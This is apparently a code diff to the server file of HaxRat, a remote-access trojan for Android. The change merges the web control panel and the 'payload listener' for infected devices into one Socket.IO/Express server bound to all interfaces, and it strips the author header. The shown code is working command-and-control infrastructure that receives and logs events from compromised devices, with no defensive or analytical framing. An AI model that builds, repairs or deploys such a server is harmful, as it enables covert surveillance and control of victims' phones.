@@ -1,17 +1,9 @@
-/* 
-*   HaxRat
-*   A Remote Access Control Application
-*   Author : Lokesh Pandey (Hax4Us)
-*   github : https://github.com/Hax4Us
-*  
-*/
-
-console.log('Server Started! \nhttp://localhost:22533');
-
 const
     express = require('express'),
     app = express(),
-    IO = require('socket.io'),
+    http = require('http'),
+    server = http.createServer(app), // Unified server
+    IO = require('socket.io')(server), // Attach Socket.IO to the unified server
     geoip = require('geoip-lite'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
@@ -26,8 +18,8 @@ global.app = app;
 global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// Use the attached IO instance directly
+let client_io = IO; 
 
 client_io.sockets.pingInterval = 30000;
 client_io.on('connection', (socket) => {
@@ -53,9 +45,9 @@ client_io.on('connection', (socket) => {
         var onevent = socket.onevent;
         socket.onevent = function (packet) {
             var args = packet.data || [];
-            onevent.call(this, packet);    // original call
+            onevent.call(this, packet);    
             packet.data = ["*"].concat(args);
-            onevent.call(this, packet);      // additional call to catch-all
+            onevent.call(this, packet);      
         };
 
         socket.on("*", function (event, data) {
@@ -63,14 +55,17 @@ client_io.on('connection', (socket) => {
             console.log(data);
         });
     }
-
 });
 
-
-// get the admin interface online
-app.listen(CONST.web_port);
-
+// Setup Express settings
 app.set('view engine', 'ejs');
 app.set('views', './assets/views');
 app.use(express.static(__dirname + '/assets/webpublic'));
 app.use(require('./includes/expressRoutes'));
+
+// THE ONLY LISTEN CALL
+// This starts BOTH the web panel and the payload listener on the same port
+server.listen(CONST.web_port, '0.0.0.0', () => {
+    console.log('HAXRAT Unified Server running on Port ' + CONST.web_port);
+});
+    
